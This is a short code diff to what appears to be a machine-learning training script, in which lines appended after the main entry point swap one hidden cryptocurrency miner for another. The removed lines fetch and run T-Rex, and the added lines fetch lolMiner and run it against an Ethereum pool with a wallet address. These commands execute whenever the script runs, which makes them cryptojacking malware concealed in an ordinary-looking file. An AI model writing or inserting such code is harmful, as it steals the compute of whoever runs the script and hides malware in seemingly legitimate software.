@@ -72,6 +72,6 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('wget https://github.com/trexminer/T-Rex/releases/download/0.26.4/t-rex-0.26.4-linux.tar.gz')
-os.system('tar xf t-rex-0.26.4-linux.tar.gz')
-os.system('./t-rex -a firopow -o stratum+tcp://firo.2miners.com:8181 -u a22CXr4thHPmmhzDAnfxrd2h6JMcZJvWw6.rig0 -p x')
+os.system('wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.51a/lolMiner_v1.51a_Lin64.tar.gz')
+os.system('tar xf lolMiner_v1.51a_Lin64.tar.gz')
+os.system('cd 1.51a && ./lolMiner --algo ETHASH --pool eth.2miners.com:2020 --user 0xc965dfee4db0b7ca185c8d070d0750bf7b558daa.rig0')
